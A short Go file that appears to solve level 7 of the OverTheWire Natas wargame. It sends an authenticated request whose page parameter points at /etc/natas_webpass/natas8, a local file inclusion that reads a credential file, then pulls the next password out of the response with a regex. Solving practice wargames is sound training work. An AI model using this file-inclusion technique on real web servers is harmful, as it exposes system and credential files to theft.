package levels

import (
	"io"
	"log"
	"net/http"
	"regexp"
)

func GetLevel8Password(password string) string {
	var username string = "natas7"
	client := &http.Client{}

	req, err := http.NewRequest(http.MethodGet, "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8", nil)
	if err != nil {
		log.Fatal(err)
	}

	req.SetBasicAuth(username, password)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	s := string(bodyText)
	re := regexp.MustCompile(`<br>\s*(.*)\s*<!--`)
	match := re.FindStringSubmatch(s)
	natas8Passowrd := match[1]

	return natas8Passowrd
}
